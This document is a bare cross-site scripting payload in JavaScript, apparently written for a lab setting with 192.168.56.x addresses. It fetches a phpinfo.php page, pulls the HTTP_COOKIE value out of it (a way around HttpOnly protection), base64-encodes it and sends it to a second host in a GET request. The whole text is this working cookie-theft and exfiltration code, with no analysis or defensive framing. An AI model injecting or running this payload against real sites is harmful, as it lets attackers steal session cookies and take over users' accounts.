<script>
fetch('http://192.168.56.102/phpinfo.php')
  .then(response => response.text())
  .then(data => {
   
    const startString = '<tr><td class="e">HTTP_COOKIE </td><td class="v">';
    const endString = '</td></tr>';

    // Find the indices where the cookie information starts and ends
    const startIndex = data.indexOf(startString) + startString.length;
    const endIndex = data.indexOf(endString, startIndex);

    // Extract the cookie information from the phpinfo page
    const cookies = data.substring(startIndex, endIndex);

    // Base64 encodes the cookies
    const encodedCookies = btoa(cookies);

    // Send the encoded cookies to another server via a GET request
    fetch('http://192.168.56.104/?encodedCookies=' + encodedCookies, {
      method: 'GET'
    });
  });
</script>
